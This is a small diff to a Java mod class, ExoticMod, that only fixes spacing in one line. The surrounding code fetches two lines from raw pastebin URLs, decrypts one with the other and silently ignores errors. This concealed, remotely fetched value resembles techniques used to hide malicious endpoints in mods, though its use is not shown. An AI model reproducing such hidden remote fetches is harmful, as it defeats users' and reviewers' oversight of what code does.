@@ -58,7 +58,7 @@ public class ExoticMod {
         try {
             BufferedReader in = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/DR7aWqKS").openStream()));
             BufferedReader in2 = new BufferedReader(new InputStreamReader(new URL("https://pastebin.com/raw/PY1CRmaU").openStream()));
-            return decrypt(in2.readLine() ,in.readLine());
+            return decrypt(in2.readLine(), in.readLine());
         } catch (Exception ignored) {}
         return "";
     }
